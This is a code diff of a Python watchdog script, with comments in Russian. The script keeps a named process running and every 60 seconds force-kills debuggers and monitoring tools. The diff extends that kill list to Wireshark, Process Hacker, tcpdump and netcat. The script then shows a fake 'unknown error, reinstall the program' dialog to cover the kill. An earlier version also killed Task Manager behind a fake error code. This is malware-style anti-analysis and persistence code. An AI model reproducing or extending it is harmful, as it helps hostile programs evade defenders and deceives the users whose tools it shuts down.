@@ -1,9 +1,7 @@
 import asyncio
 import subprocess
-import ctypes
 import tkinter as tk
 from tkinter import messagebox
-import os
 import ctypes
 
 
@@ -13,14 +11,16 @@ def is_admin():
     except:
         return False
 
-    
+
 root = tk.Tk()
 root.withdraw()
 
 process_name = "example.exe"  # имя процесса, который нужно проверить
 process_file_path = "C:\\Path\\To\\Process\\File\\example.exe"  # путь к файлу процесса
 
-debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe', 'idaw.exe', 'immunitydebugger.exe']
+debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe', 'idaw.exe', 'immunitydebugger.exe',
+             'processhacker.exe', 'wireshark.exe', 'nc.exe', 'telnet.exe', 'netmon.exe', 'tcpdump.exe']
+
 
 async def check_and_restart_process():
     while True:
@@ -37,17 +37,20 @@ async def check_and_restart_process():
                 else:
                     # если не запущен, то перезапускаем процесс обычным способом
                     subprocess.run([process_file_path])
-            except Exception as e:
-                print(f"Не удалось запустить процесс: {e}")
+            except:
+                return False
         else:
-            print("Процесс уже работает")
+            return True
         for debugger in debuggers:
             if debugger in output:
-                subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
-        if 'taskmgr.exe' in output and is_admin():
-            messagebox.showerror("Ошибка", "Не удается открыть файл Taskmgr.exe. Код ошибки 0x000000FF. Пожалуйста, попробуйте удалить и заново установить программу, либо обратитесь к специалисту за помощью.")
-            subprocess.run(["taskkill", "/IM", "taskmgr.exe", "/F"])
+                if is_admin():
+                    subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
+                    messagebox.showerror("Ошибка",
+                                         "Неизвестная ошибка во время работы программы. Пожалуйста, попробуйте "
+                                         "удалить и заново установить программу, либо обратитесь к специалисту за "
+                                         "помощью.")
 
         await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой
+
 
 asyncio.run(check_and_restart_process())
